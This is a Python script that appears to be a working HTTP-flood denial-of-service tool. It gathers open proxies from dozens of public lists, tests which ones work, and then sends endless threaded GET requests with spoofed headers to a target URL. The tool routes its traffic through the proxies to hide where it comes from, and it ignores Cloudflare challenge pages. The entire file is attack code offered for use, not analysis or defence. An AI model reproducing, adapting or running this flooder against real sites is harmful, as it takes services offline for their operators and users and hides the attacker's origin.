import requests as r, os, threading, random, click, fake_headers, time
from threading import Thread
from colorama import Fore, Style, Back
from fake_headers import Headers
version = 'deathsec lang sakalam :.:.'

iphosts = [
    'https://ipinfo.io/ip',
    'https://ipv4.icanhazip.com/',
    'https://ifconfig.io/ip',
    'https://ipecho.net/plain'
    'https://spys.me'
]

global myip
myip = r.post(random.choice(iphosts)).text

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[0;33m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	LITBU = '\033[94m'
	YELLOW = '\033[3;33m'
	CYAN = '\033[0;36'
	colors = ['\033[92m', '\033[91m', '\033[0;33m']
	RAND = random.choice(colors)


def clear(): 
	if os.name == 'nt': 
		os.system('cls') 
	else: 
		os.system('clear')

def logo():
	print(bcolors.OKGREEN + '██████╗░██████╗░░█████╗░░██████╗')
	print(bcolors.OKGREEN + '██╔══██╗██╔══██╗██╔══██╗██╔════╝')
	print(bcolors.OKGREEN + '██║░░██║██║░░██║██║░░██║╚█████╗░')
	print(bcolors.OKGREEN + '██║░░██║██║░░██║██║░░██║░╚═══██╗')
	print(bcolors.OKGREEN + '██████╔╝██████╔╝╚█████╔╝██████╔╝')
	print(bcolors.OKGREEN + '╚═════╝░╚═════╝░░╚════╝░╚═════╝░')
	print('')
	print(bcolors.WARNING + '               .:.: Developer: Mr.X4nd3r :.:.')
	print(bcolors.WARNING + '           .:.: Xander pogi: '+version)
	print('')

def check_prox(array, url):
	#myip = r.post(random.choice(iphosts)).text
	for prox in array:
		t = threading.Thread(target=check, args=(myip, prox, url))
		t.start()

def check(myip, prox, url):
	try:
		ipx = r.get(random.choice(iphosts), proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
		if ipx == myip:
			pass
		else:
			print(Fore.BLACK+Back.GREEN+"{} good proxy".format(prox)+Style.RESET_ALL)
			t = threading.Thread(target=ddos, args=(prox, url))
			t.start()
	except:
		pass

def ddos(prox, url):
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	colors = ["\x1B[31m", "\x1B[32m", "\x1B[33m", "\x1B[34m", "\x1B[35m", "\x1B[36m", "\x1B[37m"]
	color = random.choice(colors)
	while True:
		headers1 = Headers(headers=True).generate()
		t = threading.Thread(target=start_ddos, args=(prox, url, headers1, proxies, color))
		t.start()

def start_ddos(prox, url, headers1, proxies, color):
	try:
		s1 = r.Session()
		req1 = s1.get(url, headers=headers1, proxies=proxies)
		if req1.status_code == 200:
			if "<title>Just a moment...</title>" in req1.text:
				pass
			else:
				print(color+"{} sent requests...".format(prox))
	except:
		pass

@click.command()
@click.option('--proxy', '-p', help="<File with a proxy>")
@click.option('--url', '-u', help="<URL>")
def main(proxy, url):
	clear()
	logo()
	if url == None:
		print(bcolors.LITBU + "Enter the full URL example: https://google.com")
		url = input(bcolors.LITBU + "URL site: ")
	if url[:4] != "http":
		print(Fore.RED+"Enter the full URL (example: https://google.com/)"+Style.RESET_ALL)
		exit()
	if proxy == None:
		while True:
			req1 = r.get("https://api.proxyscrape.com/v2/?request=displayproxies").text
			req2 = r.get("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt").text
			req3 = r.get("https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt").text
			req4 = r.get("https://raw.githubusercontent.com/UptimerBot/proxy-list/master/proxies/http.txt").text
			req5 = r.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt").text
			req6 = r.get("https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt").text
			req7 = r.get("https://raw.githubusercontent.com/AnonPrixorPH/PRIXOR-NET/main/proxy.txt").text
			req8 = r.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt").text
			req9 = r.get("https://raw.githubusercontent.com/Knownasjohnn/PyDorker/main/proxieprem.txt").text
			req10 = r.get("https://raw.githubusercontent.com/Xandermercado800/Ddos/main/HTTP%20proxy%20premium%20(1).txt").text
			req11 = r.get("https://raw.githubusercontent.com/Xandermercado800/Tite/main/proxy.txt").text
			req12 = r.get("https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt").text
			req13 = r.get("https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt").text
			req14 = r.get("https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt").text
			req15 = r.get("https://api.openproxylist.xyz/socks5.txt").text
			req16 = r.get("https://api.openproxylist.xyz/http.txt").text
			req17 = r.get("https://alexa.lr2b.com/proxylist.txt").text
			req18 = r.get("https://multiproxy.org/txt_all/proxy.txt").text
			req19 = r.get("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt").text
			req20 = r.get("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt").text
			req21 = r.get("https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt").text
			req22 = r.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
			req23 = r.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
			req24 = r.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt")
			req25 = r.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt").text
			req26 = r.get("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt").text
			req27 = r.get("https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt").text
			req28 = r.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt").text
			req29 = r.get("https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt").text
			req30 = r.get("https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt").text
			req31 = r.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4").text
			req32 = r.get("https://api.openproxylist.xyz/socks4.txt").text
			req33 = r.get("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt").text
			req34 = r.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt").text
			req35 = r.get("https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt").text
			req36 = r.get("https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt").text
			req37 = r.get("https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt").text
			req38 = r.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt").text
			req = req1 + req2 + req3 + req4 + req5 + req6 + req7 + req8 + req9 + req10 + req11 + req12 + req13+ req14 + req15 + req16 + req17 + req18 + req19 + req20 + req21 + req22 + req23 + req24 + req25 + req26 + req27 + req28 + req29 + req30 + req31 + req32 + req33 + req34 + req35 + req36 + req37 + req38
			array = req.split()
			print(Back.YELLOW+Fore.WHITE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
			check_prox(array, url)
	else:
		try:
			fx = open(proxy)
			array = fx.read().split()
			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
			check_prox(array, url)
		except FileNotFoundError:
			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
			exit()

main()
